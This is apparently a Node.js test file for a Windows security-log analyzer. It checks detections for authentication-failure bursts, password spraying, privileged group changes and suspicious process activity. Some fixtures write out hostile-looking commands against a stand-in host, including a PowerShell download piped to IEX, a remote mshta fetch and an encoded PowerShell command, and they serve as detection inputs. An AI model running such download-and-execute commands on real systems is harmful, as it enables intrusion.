const test = require('node:test');
const assert = require('node:assert/strict');
const { parseCsv, normalizeEvents, analyze, correlationCoverage, severityForScore, normalizeSettings, eventCatalog } = require('../analysis.js');
const csvValue = value => '"' + String(value ?? '').replaceAll('"','""') + '"';
function events(records) {
  const headers = [...new Set(records.flatMap(record => Object.keys(record)))];
  const csv = [headers.map(csvValue).join(','), ...records.map(record => headers.map(header => csvValue(record[header])).join(','))].join('\r\n');
  return normalizeEvents(parseCsv(csv)).events;
}
function logon(id, minute, overrides = {}) {
  return { EventID: id, TimeCreated: '2026-10-15T09:' + String(minute).padStart(2,'0') + ':00Z', Computer: 'DC-01',
    TargetUserName: 'maya', TargetDomainName: 'NORTHWIND', IpAddress: '198.51.100.10', LogonType: '3', Message: 'Original record', ...overrides };
}
function change(id, minute, overrides = {}) {
  return { EventID: id, TimeCreated: '2026-10-15T09:' + String(minute).padStart(2,'0') + ':00Z', Computer: 'DC-01',
    Message: id === '4720' ? 'Target Account Name: temp-user; Target Account Domain: NORTHWIND; Subject Account Name: opsadmin' :
      'Member Account Name: NORTHWIND\\temp-user; Group Name: Administrators; Subject Account Name: opsadmin', ...overrides };
}
const find = (records, rule, settings) => analyze(events(records), settings).filter(finding => finding.ruleId === rule);
const burst = Array.from({length:5},(_,i) => logon('4625',i));

test('structured columns preserve original evidence and override actor/target ambiguity', () => {
  const [event] = events([logon('4625',0,{User:'NORTHWIND\\opsadmin',SubjectUserName:'opsadmin',Message:'Subject Account Name: wrong; Account Name: wrong-target'})]);
  assert.equal(event.uid,'event-1');
  assert.equal(event.lineNumber,2);
  assert.equal(event.account,'maya');
  assert.equal(event.accountDomain,'NORTHWIND');
  assert.equal(event.actor,'opsadmin');
  assert.equal(event.rawFields.find(field => field.header === 'Message').value,'Subject Account Name: wrong; Account Name: wrong-target');
});

test('sectioned Windows messages distinguish Subject, New Logon, and process creator fields', () => {
  const message = 'Subject:\n Account Name: operator\n Account Domain: NORTHWIND\nNew Logon:\n Account Name: maya\n Account Domain: NORTHWIND\nProcess Information:\n New Process Name: C:\\Windows\\cmd.exe\n Creator Process Name: C:\\Windows\\explorer.exe\nNetwork Information:\n Source Network Address: 198.51.100.10\nLogon Type: 10';
  const [event] = events([{EventID:'4624',TimeCreated:'2026-10-15T09:00:00Z',Computer:'DC-01',Message:message}]);
  assert.equal(event.account,'maya');
  assert.equal(event.actor,'operator');
  assert.equal(event.accountDomain,'NORTHWIND');
  assert.equal(event.process,'C:\\Windows\\cmd.exe');
  assert.equal(event.parent,'C:\\Windows\\explorer.exe');
  assert.equal(event.ip,'198.51.100.10');
  assert.equal(event.logonType,'10');
});

test('Subject-only logon messages do not turn the subject into the target', () => {
  const [event] = events([{EventID:'4625',User:'NORTHWIND\\operator',Message:'Subject:\nAccount Name: operator\nAccount Domain: NORTHWIND'}]);
  assert.equal(event.account,'');
  assert.equal(event.actor,'operator');
});

test('native Member and Group sections support resolved member identity and group SID', () => {
  const [event] = events([{EventID:'4732',Computer:'DC-01',Message:'Subject:\nAccount Name: operator\nMember:\nSecurity ID: NORTHWIND\\temp-user\nAccount Name: -\nGroup:\nSecurity ID: S-1-5-32-544\nGroup Name: Administrators'}]);
  assert.equal(event.account,'temp-user');
  assert.equal(event.accountDomain,'NORTHWIND');
  assert.equal(event.groupSid,'S-1-5-32-544');
  assert.equal(analyze([event])[0].ruleId,'PRIVILEGED_GROUP_ADDED');
});

test('failure bursts require the configured threshold within a time window', () => {
  assert.equal(find(burst,'AUTH_FAILURE_BURST').length,1);
  assert.equal(find(burst,'AUTH_FAILURE_BURST',{failureThreshold:6}).length,0);
  assert.equal(find(burst,'AUTH_FAILURE_BURST',{authWindowMinutes:2}).length,0);
  assert.equal(find(burst,'AUTH_FAILURE_BURST',{failureThreshold:3,authWindowMinutes:2}).length,1);
});

for (const [label,overrides] of [['source',{IpAddress:'198.51.100.11'}],['host',{Computer:'DC-02'}],['domain',{TargetDomainName:'OTHER'}]]) {
  test('failure bursts do not merge a different ' + label, () => {
    assert.equal(find([...burst.slice(0,4),logon('4625',4,overrides)],'AUTH_FAILURE_BURST').length,0);
  });
}

test('success after failures matches the same context and retains exact event references', () => {
  const normalized = events([...burst,logon('4624',5)]);
  const [finding] = analyze(normalized).filter(item => item.ruleId === 'AUTH_SUCCESS_AFTER_FAILURES');
  assert.equal(finding.events.length,6);
  assert.ok(finding.events.every(event => normalized.includes(event)));
  assert.equal(finding.score,60);
  assert.equal(finding.severity,'High');
  assert.equal(finding.matchedFields.find(item => item.label === 'Source IP').value,'198.51.100.10');
});

for (const [label,overrides] of [['source',{IpAddress:'198.51.100.99'}],['host',{Computer:'DC-02'}],['account',{TargetUserName:'someone-else'}],['logon type',{LogonType:'10'}]]) {
  test('success with a different ' + label + ' is not joined to failures', () => {
    assert.equal(find([...burst,logon('4624',5,overrides)],'AUTH_SUCCESS_AFTER_FAILURES').length,0);
  });
}
test('success before a later failure still correlates with its own preceding burst', () => {
  assert.equal(find([...burst,logon('4624',5),logon('4625',8)],'AUTH_SUCCESS_AFTER_FAILURES').length,1);
});
test('success outside the configured window does not correlate', () => {
  assert.equal(find([...burst,logon('4624',20)],'AUTH_SUCCESS_AFTER_FAILURES').length,0);
});
test('equal timestamps use input order and cannot use failures appearing after success', () => {
  assert.equal(find([logon('4624',0),...burst.map(event => ({...event,TimeCreated:'2026-10-15T09:00:00Z'}))],'AUTH_SUCCESS_AFTER_FAILURES').length,0);
});
for (const timestamp of ['', '10/11/2026 9:00:00', '2026-10-15']) {
  test('timed correlations exclude missing, ambiguous, or date-only time: ' + timestamp, () => {
    const normalized=events(burst.map(event => ({...event,TimeCreated:timestamp})));
    assert.equal(analyze(normalized).filter(item => item.ruleId.startsWith('AUTH_')).length,0);
    assert.equal(correlationCoverage(normalized).authenticationExcluded,5);
  });
}
test('mixed explicit timezone and local wall time are not joined into a window', () => {
  assert.equal(find([...burst.slice(0,4),logon('4625',4,{TimeCreated:'2026-10-15 09:04:00'})],'AUTH_FAILURE_BURST').length,0);
});

const spray = burst.map((event,index) => ({...event,TargetUserName:'target-'+index}));
test('password spraying counts distinct accounts from one IP and host', () => {
  const [finding] = find(spray,'AUTH_PASSWORD_SPRAY');
  assert.equal(finding.events.length,5);
  assert.equal(finding.matchedFields.find(item => item.label === 'Distinct target accounts').value,'5');
  assert.equal(find(burst,'AUTH_PASSWORD_SPRAY').length,0);
});
test('spray detection respects source, host, threshold, and time boundaries', () => {
  assert.equal(find(spray.map((event,i) => ({...event,TimeCreated:'2026-10-15T09:'+String(i*5).padStart(2,'0')+':00Z'})),'AUTH_PASSWORD_SPRAY').length,0);
  assert.equal(find([...spray.slice(0,4),{...spray[4],Computer:'DC-02'}],'AUTH_PASSWORD_SPRAY').length,0);
  assert.equal(find(spray,'AUTH_PASSWORD_SPRAY',{sprayAccountThreshold:6}).length,0);
});

test('new account plus privileged group produces a bounded correlation with one evidence set', () => {
  const findings=analyze(events([change('4720',0),change('4732',4)]));
  assert.deepEqual(findings.map(item => item.ruleId),['ACCOUNT_CREATED_PRIVILEGED_GROUP']);
  assert.equal(findings[0].score,80);
  assert.equal(findings[0].events.length,2);
});
for (const [label,overrides] of [['later window',{TimeCreated:'2026-10-15T09:31:00Z'}],['host',{Computer:'DC-02'}],
  ['target',{Message:'Member Account Name: NORTHWIND\\other-user; Group Name: Administrators; Subject Account Name: opsadmin'}],
  ['domain',{Message:'Member Account Name: OTHER\\temp-user; Group Name: Administrators; Subject Account Name: opsadmin'}],
  ['missing time',{TimeCreated:''}]]) {
  test('account changes with a different ' + label + ' are not correlated', () => {
    const findings=analyze(events([change('4720',0),change('4732',4,overrides)]));
    assert.ok(findings.every(item => !item.ruleId.startsWith('ACCOUNT_CREATED_')));
  });
}
test('account window setting changes the accepted interval', () => {
  assert.equal(find([change('4720',0),change('4732',31)],'ACCOUNT_CREATED_PRIVILEGED_GROUP',{accountWindowMinutes:60}).length,1);
});
test('known conflicting SIDs prevent account correlation', () => {
  assert.equal(find([change('4720',0,{TargetSid:'S-1-5-21-1-2-3-1001'}),change('4732',4,{MemberSid:'S-1-5-21-1-2-3-1002'})],'ACCOUNT_CREATED_PRIVILEGED_GROUP').length,0);
});
test('a member SID can match account creation even when its name is absent', () => {
  const normalized=events([
    change('4720',0,{TargetSid:'S-1-5-21-1-2-3-1001'}),
    change('4732',4,{Message:'Group Name: Administrators',MemberSid:'S-1-5-21-1-2-3-1001'})
  ]);
  assert.equal(analyze(normalized)[0].ruleId,'ACCOUNT_CREATED_PRIVILEGED_GROUP');
});
test('privileged-group cues use group values, never actor names or unrelated prose', () => {
  const [finding]=analyze(events([change('4732',4,{Message:'Member Account Name: NORTHWIND\\temp-user; Group Name: Finance; Subject Account Name: domain-admin; Description: Administrators'})]));
  assert.equal(finding.ruleId,'GROUP_ADDED');
  assert.equal(finding.severity,'Low');
});

function processRecord(overrides={}) {
  return {EventID:'4688',Computer:'WS-01',NewProcessName:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    ParentProcessName:'C:\\Windows\\explorer.exe',CommandLine:'powershell.exe Get-Date',Message:'Original process record',...overrides};
}
test('benign PowerShell and an encoded switch in a different program do not trigger the PowerShell cue', () => {
  assert.equal(find([processRecord()],'PS_ENCODED').length,0);
  assert.equal(find([processRecord({NewProcessName:'C:\\Windows\\cmd.exe',CommandLine:'cmd -enc demo'})],'PS_ENCODED').length,0);
});
test('encoded-command cue records the precise matched expression', () => {
  const [finding]=find([processRecord({CommandLine:'powershell.exe -EncodedCommand RABFAE0ATwA='})],'PS_ENCODED');
  assert.equal(finding.matchedFields.find(item=>item.label==='Matched expression').value,'-EncodedCommand');
});
test('an encoded word in unrelated event prose is not treated as a process command', () => {
  assert.equal(find([processRecord({Message:'A report mentions -EncodedCommand'})],'PS_ENCODED').length,0);
});
test('Office parent and shell child must both be present in the same record', () => {
  assert.equal(find([processRecord({ParentProcessName:'C:\\Office\\WINWORD.EXE'})],'OFFICE_SHELL_CHILD').length,1);
  assert.equal(find([processRecord({ParentProcessName:'C:\\Office\\WINWORD.EXE',NewProcessName:'C:\\Windows\\notepad.exe'})],'OFFICE_SHELL_CHILD').length,0);
});
test('download-and-execute cue requires both expressions in a PowerShell record', () => {
  assert.equal(find([{EventID:'4104',ScriptBlockText:'Invoke-WebRequest https://example.invalid/demo.txt | IEX'}],'PS_DOWNLOAD_EXECUTE').length,1);
  assert.equal(find([{EventID:'4104',ScriptBlockText:'Invoke-WebRequest https://example.invalid/demo.txt'}],'PS_DOWNLOAD_EXECUTE').length,0);
});
test('remote script-host cue requires the relevant process and resource argument', () => {
  assert.equal(find([processRecord({NewProcessName:'C:\\Windows\\mshta.exe',CommandLine:'mshta.exe https://example.invalid/demo.hta'})],'SCRIPT_HOST_REMOTE').length,1);
  assert.equal(find([processRecord({NewProcessName:'C:\\Windows\\regsvr32.exe',CommandLine:'regsvr32.exe local.dll'})],'SCRIPT_HOST_REMOTE').length,0);
});

const expanded = [['4740','ACCOUNT_LOCKED'],['4648','EXPLICIT_CREDENTIALS'],['4698','TASK_CREATED'],['4702','TASK_UPDATED'],['4699','TASK_DELETED'],
  ['4719','AUDIT_POLICY_CHANGED'],['4946','FIREWALL_RULE_CHANGED'],['4947','FIREWALL_RULE_CHANGED'],['4948','FIREWALL_RULE_CHANGED'],['4950','FIREWALL_SETTING_CHANGED']];
for (const [id,rule] of expanded) {
  test('expanded event ' + id + ' has a review cue and logging requirements', () => {
    const [finding]=find([{EventID:id,Computer:'SRV-01',Message:'Original event'}],rule);
    assert.ok(finding);
    assert.ok(eventCatalog[id].audit);
    assert.ok(eventCatalog[id].fields);
    assert.ok(finding.matchedFields.some(item=>item.label==='Event ID'));
  });
}
test('native task XML remains available as extracted and original evidence', () => {
  const xml='<Task>\n<Actions><Exec><Command>demo.exe</Command></Exec></Actions>\n</Task>';
  const [event]=events([{EventID:'4698',Message:'Task Information:\nTask Name: \\DemoTask\nTask Content: '+xml}]);
  assert.equal(event.taskName,'\\DemoTask');
  assert.equal(event.taskContent,xml);
  assert.ok(event.message.includes(xml));
});
test('all findings have stable rule IDs and scores that sum to a consistent priority', () => {
  const normalized=events([...burst,logon('4624',5),...expanded.map(([id])=>({EventID:id,Computer:'DC-01',Message:'Original event'}))]);
  const findings=analyze(normalized);
  assert.deepEqual(analyze(normalized).map(item=>item.id),findings.map(item=>item.id));
  for (const finding of findings) {
    assert.equal(finding.score,finding.scoreBreakdown.reduce((sum,item)=>sum+item.points,0));
    assert.equal(finding.severity,severityForScore(finding.score));
    assert.ok(finding.ruleId);
    assert.ok(finding.matchedFields.length);
    assert.ok(finding.events.every(event=>event.uid && Number.isInteger(event.lineNumber)));
  }
  assert.equal(severityForScore(0),'Informational');
  assert.equal(severityForScore(29),'Low');
  assert.equal(severityForScore(30),'Medium');
  assert.equal(severityForScore(60),'High');
});
test('settings clamp values and retain compatibility with the earlier numeric threshold argument', () => {
  assert.deepEqual(normalizeSettings(8),{failureThreshold:8,authWindowMinutes:10,sprayAccountThreshold:5,accountWindowMinutes:30});
  assert.equal(normalizeSettings({authWindowMinutes:999999}).authWindowMinutes,1440);
});

test('offset timestamp parsing rejects impossible calendar dates before correlation', () => {
  const normalized=events(burst.map(event=>({...event,TimeCreated:'2026-02-30T09:00:00Z'})));
  assert.ok(normalized.every(event=>event.timestampStatus==='unrecognized'));
  assert.equal(analyze(normalized).filter(item=>item.ruleId==='AUTH_FAILURE_BURST').length,0);
});
test('advanced checked-in sample supplies the documented spray, process, and policy examples', () => {
  const fs=require('node:fs'),path=require('node:path');
  const normalized=normalizeEvents(parseCsv(fs.readFileSync(path.join(__dirname,'../samples/correlation-policy-lab.csv'),'utf8'))).events;
  const ids=new Set(analyze(normalized).map(item=>item.ruleId));
  for(const rule of ['AUTH_PASSWORD_SPRAY','PS_ENCODED','OFFICE_SHELL_CHILD','PS_DOWNLOAD_EXECUTE','AUDIT_POLICY_CHANGED','FIREWALL_RULE_CHANGED','FIREWALL_SETTING_CHANGED']) assert.ok(ids.has(rule),rule);
});
test('message extraction retains command semicolons so same-record script cues are not lost', () => {
  const message='New Process Name: C:\\Windows\\powershell.exe; Process Command Line: powershell.exe Invoke-WebRequest https://example.invalid/demo.txt; IEX $demo; Subject Account Name: maya';
  const normalized=events([{EventID:'4688',Message:message}]);
  assert.ok(normalized[0].command.includes('; IEX $demo'));
  assert.ok(analyze(normalized).some(finding=>finding.ruleId==='PS_DOWNLOAD_EXECUTE'));
});
